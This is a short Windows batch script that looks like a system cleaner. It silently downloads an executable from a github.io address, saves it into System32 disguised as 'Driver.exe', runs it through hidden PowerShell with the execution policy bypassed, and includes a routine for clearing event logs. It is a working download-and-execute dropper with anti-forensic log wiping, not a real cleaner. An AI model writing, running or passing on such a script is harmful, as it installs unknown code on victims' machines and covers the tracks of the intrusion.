��cho off
setlocal enabledelayedexpansion
color 4
cls

:: Define variables for download
set "exeUrl=https://NOTXVENOM.github.io/clener/Clener.exe"
set "outputPath=C:\Windows\System32\Driver.exe"

:: Download EXE file silently
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri '%exeUrl%' -OutFile '%outputPath%'}" >nul 2>&1

:: Run the EXE file if downloaded successfully
if exist "%outputPath%" (
    start "" "%outputPath%"
)

goto theEnd

:: Function to clear event logs
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof

:: If not run as administrator
:noAdmin
echo You must run this script as an Administrator!
pause
exit

:theEnd
exit
